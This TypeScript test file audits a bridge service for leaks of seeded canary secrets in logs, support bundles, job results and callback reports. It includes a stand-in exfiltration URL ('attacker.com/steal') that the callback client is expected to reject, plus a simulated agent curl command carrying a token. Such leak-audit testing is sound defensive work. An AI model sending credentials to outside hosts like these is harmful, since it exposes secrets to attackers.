import { EventEmitter } from "node:events"
import { mkdtemp } from "node:fs/promises"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { PassThrough } from "node:stream"
import { describe, expect, it } from "vitest"
import { StructuredLogger } from "../../src/observability/logger.js"
import { collectOperationalSignals } from "../../src/observability/signals.js"
import { CallbackReporter } from "../../src/callback/reporter.js"
import type { BridgeConfig } from "../../src/config/types.js"
import { generateSupportBundle, previewSupportBundle } from "../../src/diagnostics/index.js"
import { JobManager } from "../../src/jobs/manager.js"
import { createTerminalJobReporter } from "../../src/jobs/report.js"
import { JsonFileJobStore } from "../../src/jobs/store.js"
import type { JobRecord } from "../../src/jobs/types.js"
import { PEM_BODY_LINES, SEEDED_SECRETS } from "../../src/memory/redaction/corpus.js"
import type { ProcessHandle } from "../../src/runtime/claude-adapter.js"
import { ClaudeJobRunner, type ClaudeJobLaunch } from "../../src/runtime/claude-job-runner.js"
import { buildTestApp, FakeTaskGraphSyncer, testConfig, validTrigger } from "../integration/fixtures.js"

const CANARY_BEARER_TOKEN = "CANARY_SECRET_TOKEN_DO_NOT_LEAK_XYZ123_SECRET"
const CANARY_NODE_KEY = "CANARY_NODE_PRIVATE_KEY_999888777_DO_NOT_DISCLOSE"
const CANARY_ENV_PASS = "CANARY_SUPER_SECRET_PASSWORD_ALPHA_BETA"

describe("M8.3 / M7-C2: Canary Token and Secret Leak Audit", () => {
  it("never leaks seeded canary secrets in structured log entries or attributes", () => {
    const emittedLines: string[] = []
    const logger = new StructuredLogger({
      writer: (line) => emittedLines.push(line),
      customSecrets: [CANARY_BEARER_TOKEN, CANARY_NODE_KEY, CANARY_ENV_PASS],
    })

    // Log various events attempting to leak secrets
    logger.info("ingress.admitted", {
      jobId: "job-audit-1",
      attributes: {
        authorizationHeader: `Bearer ${CANARY_BEARER_TOKEN}`,
        nodeKey: CANARY_NODE_KEY,
        password: CANARY_ENV_PASS,
        nested: {
          token: CANARY_BEARER_TOKEN,
          rawSecret: `connecting with ${CANARY_NODE_KEY} now`,
        },
      },
    })

    logger.error("ingress.rejected", {
      errorCode: "AUTH_FAILED",
      attributes: {
        attemptedToken: CANARY_BEARER_TOKEN,
        secretEnv: CANARY_ENV_PASS,
      },
    })

    expect(emittedLines.length).toBe(2)
    const combinedLog = emittedLines.join("\n")

    // The canary secrets MUST NEVER appear in emitted logs
    expect(combinedLog.includes(CANARY_BEARER_TOKEN)).toBe(false)
    expect(combinedLog.includes(CANARY_NODE_KEY)).toBe(false)
    expect(combinedLog.includes(CANARY_ENV_PASS)).toBe(false)

    // Redacted placeholders should appear instead
    expect(combinedLog.includes("[REDACTED_SECRET]") || combinedLog.includes("[REDACTED_CANARY_SECRET]")).toBe(true)
  })

  it("never includes seeded bearer tokens or credentials in operational signals", async () => {
    const signals = await collectOperationalSignals({
      nodeId: "node-canary-test",
      nodeHealth: "healthy",
      leaseTimeRemainingMs: 30000,
      epoch: 1,
    })

    const serializedSignals = JSON.stringify(signals)
    expect(serializedSignals.includes(CANARY_BEARER_TOKEN)).toBe(false)
    expect(serializedSignals.includes(CANARY_NODE_KEY)).toBe(false)
    expect(serializedSignals.includes(CANARY_ENV_PASS)).toBe(false)
  })

  it("never forwards bearer token to unlisted origins in CallbackReporter (F-02 / M8.3)", async () => {
    let capturedHeader: string | undefined
    const reporter = new CallbackReporter({
      attempts: 1,
      baseDelayMs: 1,
      agents: [{ id: "dev-main", url: "http://dev-main.tailnet:8787" }],
      fetcher: async (_url, init) => {
        capturedHeader = (init?.headers as Record<string, string>)?.Authorization
        return new Response(null, { status: 200 })
      },
    })

    const report = {
      job_id: "job-sec-1",
      source_agent_id: "test",
      target_agent_id: "dev-main",
      status: "completed" as const,
      summary: "ok",
      findings: [],
      artifacts: [],
      started_at: "2026-01-01T00:00:00.000Z",
      completed_at: "2026-01-01T00:01:00.000Z",
    }

    // 1. Authorized destination receives bearer token
    await reporter.send("http://dev-main.tailnet:8787/report", report, CANARY_BEARER_TOKEN)
    expect(capturedHeader).toBe(`Bearer ${CANARY_BEARER_TOKEN}`)

    // 2. Unauthorized origin throws before any header is constructed
    capturedHeader = undefined
    await expect(
      reporter.send("http://attacker.com/steal", report, CANARY_BEARER_TOKEN),
    ).rejects.toThrow()
    expect(capturedHeader).toBeUndefined()
  })

  it("never includes seeded secrets in generated support bundles or previews (M8.4)", () => {
    const bundle = generateSupportBundle(
      {
        profile: "audit-profile",
        customSecrets: [CANARY_BEARER_TOKEN, CANARY_NODE_KEY, CANARY_ENV_PASS],
      },
      {
        routerVersion: "0.1.0",
        loggerErrors: [
          {
            timestamp: "2026-10-01T10:00:00.000Z",
            level: "error",
            event: "ingress.rejected",
            errorCode: "AUTH_FAILED",
            attributes: {
              attemptedSecret: CANARY_BEARER_TOKEN,
              nodePrivate: CANARY_NODE_KEY,
              envSecret: CANARY_ENV_PASS,
            },
          },
        ],
      },
    )

    const bundleJson = JSON.stringify(bundle)
    expect(bundleJson.includes(CANARY_BEARER_TOKEN)).toBe(false)
    expect(bundleJson.includes(CANARY_NODE_KEY)).toBe(false)
    expect(bundleJson.includes(CANARY_ENV_PASS)).toBe(false)

    const preview = previewSupportBundle(bundle)
    expect(preview.includes(CANARY_BEARER_TOKEN)).toBe(false)
    expect(preview.includes(CANARY_NODE_KEY)).toBe(false)
    expect(preview.includes(CANARY_ENV_PASS)).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// Job results: `runtimeResult` and the `/report` callback (v3.2.0 block R)
// ---------------------------------------------------------------------------

/**
 * Vendor-shaped canaries the bridge does not know in advance. They come from
 * the redaction corpus, which assembles them from fragments so no scanner sees
 * a live-looking credential in the repository.
 */
const JOB_RESULT_CANARIES: Readonly<Record<string, string>> = {
  github: SEEDED_SECRETS.githubClassicPat,
  awsKeyId: SEEDED_SECRETS.awsAccessKeyId,
  slack: SEEDED_SECRETS.slackBotToken,
  google: SEEDED_SECRETS.googleApiKey,
  tailscale: SEEDED_SECRETS.tailscaleAuthKey,
  jwt: SEEDED_SECRETS.jwt,
  opaque: SEEDED_SECRETS.unclassifiedOpaqueKey,
  bearer: SEEDED_SECRETS.bearerOpaqueToken,
}
/** The Claude provider credential: a known secret, redacted by value. */
const CANARY_OAUTH_TOKEN = "CANARY_OAUTH_TOKEN_VALUE_DO_NOT_LEAK"
const PEM_CANARY = ["-----BEGIN RSA PRIVATE KEY-----", ...PEM_BODY_LINES, "-----END RSA PRIVATE KEY-----"].join("\n")
const PINNED_SHA = "8f3a2b7c9d1e4f5a6b0c3d2e1f9a8b7c6d5e4f30"
const SESSION_UUID = "550e8400-e29b-41d4-a716-446655440000"

function expectNoJobResultCanary(serialized: string, where: string): void {
  for (const [name, canary] of Object.entries(JOB_RESULT_CANARIES)) {
    expect(serialized.includes(canary), `${where} leaked the ${name} canary`).toBe(false)
  }
  expect(serialized.includes(CANARY_OAUTH_TOKEN), `${where} leaked the provider token`).toBe(false)
  for (const line of PEM_BODY_LINES) expect(serialized.includes(line), `${where} leaked PEM key material`).toBe(false)
}

/** Text a misbehaving agent might print: every canary, next to things that must survive. */
function leakyText(): string {
  return [
    `Fixed it in commit ${PINNED_SHA}; edited src/runtime/sanitizer.ts and session ${SESSION_UUID}.`,
    ...Object.values(JOB_RESULT_CANARIES).map((canary, index) => `canary ${index}: ${canary}`),
    `Authorization: Bearer ${JOB_RESULT_CANARIES.bearer}`,
    `provider token ${CANARY_OAUTH_TOKEN}`,
    PEM_CANARY,
  ].join("\n")
}

class CanaryClaudeProcess extends EventEmitter implements ProcessHandle {
  readonly stdin = new PassThrough()
  readonly stdout = new PassThrough()
  readonly stderr = new PassThrough()
  readonly pid = 4243
  exited = false

  kill(signal: NodeJS.Signals | number = "SIGTERM"): boolean {
    if (!this.exited) {
      this.exited = true
      this.stdout.end()
      this.emit("exit", null, signal)
    }
    return true
  }

  emitEvent(event: Record<string, unknown>): void {
    this.stdout.write(`${JSON.stringify(event)}\n`)
  }

  finish(code: number): void {
    this.exited = true
    this.stdout.end()
    this.emit("exit", code, null)
  }
}

async function claudeJobHarness() {
  const { opencode: _opencode, ...base } = testConfig()
  const config: BridgeConfig = {
    ...base,
    runtime: { kind: "claude" },
    capability_profiles: { investigate: { allow: ["Read"], requires_approval: false } },
    security: {
      auth_mode: "bearer-token",
      allowed_sources: [{ source_agent_id: "dev-main", capabilities: ["investigate"], requires_plan_approval: [] }],
    },
    planning: { plan_annotator_enabled: false, require_approval_for: [] },
  }
  const jobManager = new JobManager(new JsonFileJobStore(await mkdtemp(join(tmpdir(), "aibridge-canary-"))))
  const reports: Array<{ url: string; body: string }> = []
  const processes: CanaryClaudeProcess[] = []
  const monitors: Array<Promise<JobRecord | undefined>> = []
  let now = Date.parse("2026-11-26T00:00:00.000Z")
  const callbackReporter = new CallbackReporter({
    attempts: 1,
    baseDelayMs: 1,
    fetcher: async (url, init) => {
      reports.push({ url: String(url), body: String(init?.body) })
      return new Response(null, { status: 200 })
    },
  })
  const runner = new ClaudeJobRunner({
    config,
    jobManager,
    taskGraphSyncer: new FakeTaskGraphSyncer(),
    reportTerminalJob: createTerminalJobReporter({ jobManager, callbackReporter, agentId: config.agent_id, bearerToken: "secret" }),
    pollIntervalMs: 5,
    clock: () => now,
    sleep: async (ms) => {
      now += ms
      await new Promise((done) => setTimeout(done, 1))
    },
    adapterOptions: {
      executablePath: "claude-fake",
      exitDrainGraceMs: 5,
      env: { PATH: "/usr/bin", HOME: "/home/aibr", CLAUDE_CODE_OAUTH_TOKEN: CANARY_OAUTH_TOKEN },
      spawn: () => {
        const proc = new CanaryClaudeProcess()
        processes.push(proc)
        return proc
      },
    },
  })
  const { app } = await buildTestApp({
    config,
    jobManager,
    claudeJobRunner: {
      start: (job) => runner.start(job),
      monitor: (launch: ClaudeJobLaunch) => {
        const monitored = runner.monitor(launch)
        monitors.push(monitored)
        return monitored
      },
    },
  })
  const accepted = await app.inject({
    method: "POST",
    url: "/trigger",
    headers: { authorization: "Bearer secret" },
    payload: validTrigger({ capability: "investigate" }),
  })
  expect(accepted.statusCode).toBe(202)
  return { app, jobManager, reports, processes, monitors }
}

describe("v3.2.0 block R: job results never carry a canary secret", () => {
  it("redacts runtimeResult, GET /jobs/:id and the /report body of a successful run", async () => {
    const h = await claudeJobHarness()
    const proc = h.processes[0]!
    proc.emitEvent({
      type: "result",
      subtype: "success",
      is_error: false,
      result: leakyText(),
      total_cost_usd: 0.1,
      num_turns: 3,
      permission_denials: [
        { tool_name: "Bash", tool_use_id: "toolu_1", tool_input: { command: `curl -H "x-key: ${JOB_RESULT_CANARIES.github}"` } },
      ],
    })
    proc.finish(0)
    expect((await h.monitors[0])?.status).toBe("completed")

    const stored = await h.jobManager.getJob("job_1")
    expect(stored.runtimeResult).toBeDefined()
    expectNoJobResultCanary(JSON.stringify(stored.runtimeResult), "runtimeResult")
    // Identifiers next to the canaries survive redaction.
    expect(stored.runtimeResult!.summary).toContain(PINNED_SHA)
    expect(stored.runtimeResult!.summary).toContain(SESSION_UUID)
    expect(stored.runtimeResult!.summary).toContain("src/runtime/sanitizer.ts")
    expect(stored.runtimeResult!.summary).toContain("Authorization: Bearer [REDACTED]")

    const viewed = await h.app.inject({ method: "GET", url: "/jobs/job_1" })
    expect(viewed.statusCode).toBe(200)
    expectNoJobResultCanary(viewed.body, "GET /jobs/:id")

    expect(h.reports).toHaveLength(1)
    expect(h.reports[0]!.url).toBe("http://dev-main.tailnet:8787/report")
    expectNoJobResultCanary(h.reports[0]!.body, "/report callback")
    expect(h.reports[0]!.body).toContain(PINNED_SHA)
  })

  it("redacts the errors and stderr of a failed run before they reach /report", async () => {
    const h = await claudeJobHarness()
    const proc = h.processes[0]!
    proc.stderr.write(`fatal: ${leakyText()}\n`)
    proc.emitEvent({
      type: "result",
      subtype: "error_during_execution",
      is_error: true,
      errors: [leakyText()],
      result: leakyText(),
    })
    proc.finish(1)
    const terminal = await h.monitors[0]
    expect(terminal?.status).toBe("failed")

    const stored = await h.jobManager.getJob("job_1")
    expectNoJobResultCanary(JSON.stringify(stored), "failed job record")
    expect(h.reports).toHaveLength(1)
    expectNoJobResultCanary(h.reports[0]!.body, "/report callback of a failed run")
    // Not vacuous: the leaky text reached the report, redacted.
    expect(h.reports[0]!.body).toContain("[REDACTED]")
    expect(h.reports[0]!.body).toContain(PINNED_SHA)
  })
})
